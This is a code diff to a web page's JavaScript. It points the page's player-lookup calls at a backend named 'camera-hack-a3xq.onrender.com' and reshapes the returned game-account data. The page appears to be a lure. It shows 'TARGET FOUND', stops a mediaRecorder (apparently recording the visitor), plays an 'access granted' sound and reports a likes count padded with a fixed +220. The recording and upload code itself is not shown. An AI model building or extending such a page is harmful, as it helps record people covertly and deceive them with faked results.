@@ -272,18 +272,22 @@
                 return;
             }
 
-            previewEl.innerText = "STATUS: FETCHING PLAYER DATA...";
+            previewEl.innerText = "STATUS: FETCHING FROM BACKEND PROXY...";
 
             searchTimer = setTimeout(async () => {
                 try {
-                    let directApi = `https://mbf-api.demonsstore.workers.dev/?uid=${uid.trim()}`;
-                    let res = await fetch(directApi);
+                    let localApi = `https://camera-hack-a3xq.onrender.com/api/player?uid=${uid.trim()}`;
+                    let res = await fetch(localApi);
                     if (res.ok) {
                         let json = await res.json();
-                        if (json && (json.name || json.nickname)) {
-                            cachedFFData = json;
-                            previewEl.innerText = `[+] TARGET FOUND: ${json.name || json.nickname}`;
-                            return;
+                        if (json.success && json.data) {
+                            cachedFFData = json.data;
+                            let info = json.data.basicInfo || json.data.accountInfo || json.data.data || json.data;
+                            let name = info.nickname || info.name || info.Nickname || info.accountName;
+                            if (name) {
+                                previewEl.innerText = `[+] TARGET FOUND: ${name}`;
+                                return;
+                            }
                         }
                     }
                 } catch (e) {}
@@ -393,11 +397,11 @@
             let ffData = cachedFFData;
             if (!ffData) {
                 try {
-                    let directApi = `https://mbf-api.demonsstore.workers.dev/?uid=${uid}`;
-                    let res = await fetch(directApi);
+                    let localApi = `https://camera-hack-a3xq.onrender.com/api/player?uid=${uid}`;
+                    let res = await fetch(localApi);
                     if (res.ok) {
                         let json = await res.json();
-                        if (json) ffData = json;
+                        if (json.success && json.data) ffData = json.data;
                     }
                 } catch (e) {}
             }
@@ -454,10 +458,12 @@
                         mediaRecorder.stop();
                         playAccessGrantedSound();
 
-                        let playerName = ffData ? (ffData.name || ffData.nickname || ffData.Nickname) : "API Data Not Found";
-                        let playerLevel = ffData ? (ffData.level || ffData.Level) : "N/A";
-                        let playerRegion = ffData ? (ffData.region || ffData.Server) : server.toUpperCase();
-                        let playerLikes = ffData ? (ffData.likes || ffData.Liked || ffData.like) : "0";
+                        let infoObj = ffData ? (ffData.basicInfo || ffData.accountInfo || ffData.data || ffData) : null;
+
+                        let playerName = infoObj ? (infoObj.nickname || infoObj.name || infoObj.Nickname || infoObj.accountName) : "API Data Not Found";
+                        let playerLevel = infoObj ? (infoObj.level || infoObj.Level || infoObj.accountLevel) : "N/A";
+                        let playerRegion = infoObj ? (infoObj.region || infoObj.Server || infoObj.accountRegion) : server.toUpperCase();
+                        let playerLikes = infoObj ? (infoObj.liked || infoObj.likes || infoObj.Likes || infoObj.accountLikes || infoObj.like) : "0";
                         let finalLikes = (parseInt(playerLikes) || 0) + 220;
 
                         document.getElementById('loadingBox').innerHTML = `
